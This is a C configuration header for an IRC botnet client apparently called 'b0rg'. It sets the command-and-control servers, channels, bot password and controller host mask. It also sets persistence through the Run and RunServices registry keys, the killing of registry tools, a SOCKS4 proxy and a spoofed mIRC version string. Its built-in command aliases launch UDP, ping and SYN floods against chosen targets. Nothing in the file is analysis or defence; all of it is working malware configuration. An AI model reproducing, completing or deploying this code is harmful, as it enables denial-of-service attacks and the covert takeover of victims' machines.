 #define vername "b0rg 100487-083t"
// #define REMOVE_NONSYNNERS
// #define NO_IDENT
   #define NO_SPY
// #define NO_UDP
// #define NO_PING
// #define NO_NETINFO
// #define NO_SYSINFO
// #define NO_REDIRECT
// #define NO_DOWNLOAD
// #define NO_VISIT
// #define NO_CONNCHECK
// #define NO_MODEONCONN
// #define NO_SOCK4SERV
// #define NO_CHGCONF
// #define NO_SCAN

 #define SOCKS4_CONNECT 1
 #define SOCKS4_GRANT 90
 #define SOCKS4_REJECT 91

 #define addpredefinedaliases() \
 	addalias("opme", "mode $chan +o $user"); \
 	addalias("smack", "action $chan smacks $1"); \
 	addalias("u1", "udp $1 10000 2048 50"); \
 	addalias("p2", "ping $1 10000 $2 50"); \
 	addalias("s1", "syn $1 80 60"); \
	addalias("ctcp", "raw PRIVMSG $1 :$chr(1)$2-$chr(1)");

 const char *authost[] = {"*ident@*.bot.net", "*blah@*.*", "\0"};
 const  int maxrand = 3;
 const char botid[] = "b0rg1";
 const char password[] = "100487-083t";
 const  int maxlogins = 3;
 const char server[] = "primary.server.net";
 const  int port = 6667;
 const char serverpass[] = "";
 const char channel[] = "#channel1";
 const char chanpass[] = "";
 const char server2[] = "secondary.server.net";
 const  int port2 = 6667;
 const char channel2[] = "#channel2";
 const char chanpass2[] = "";
 const BOOL topiccmd = TRUE;
 const BOOL rndfilename = FALSE;
 const char filename[] = "b0rg.exe";
 const BOOL regrun = TRUE;
 const BOOL regrunservices = TRUE;
 const char valuename[] = "b0rg 100487-083t";
 const char prefix = '.';
 const char version[] = "mIRC v6.03 Khaled Mardam-Bey";
 const  int cryptkey = 0;
 const  int maxaliases = 16;
 const BOOL KillRegTools = TRUE;
 const char modeonconn[] = "+i";
 const  int sock4port = 1234;

